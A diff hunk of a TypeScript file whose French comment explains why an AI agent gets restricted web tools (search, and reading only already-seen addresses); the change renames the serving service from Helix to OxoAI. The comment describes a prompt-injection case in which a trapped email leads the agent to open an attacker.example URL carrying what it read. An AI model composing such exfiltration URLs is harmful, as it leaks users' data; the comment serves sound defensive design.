@@ -11,7 +11,7 @@ import { parcourirBalises, sansBalises } from "./texteBrut.ts";
  * outils web d'OpenClaw, qui ouvrent n'importe quelle adresse : un mail piégé
  * pouvait lui faire composer `https://attaquant.example/?d=<ce qu'il a lu>`,
  * et la donnée partait avec l'adresse. Il a ceux-ci à la place, servis par
- * Helix :
+ * OxoAI :
  *
  *  - `web__chercher` : une recherche (DuckDuckGo, sans compte ni clé) ;
  *  - `web__lire` : ouvrir une page, **seulement si son adresse a déjà été vue**
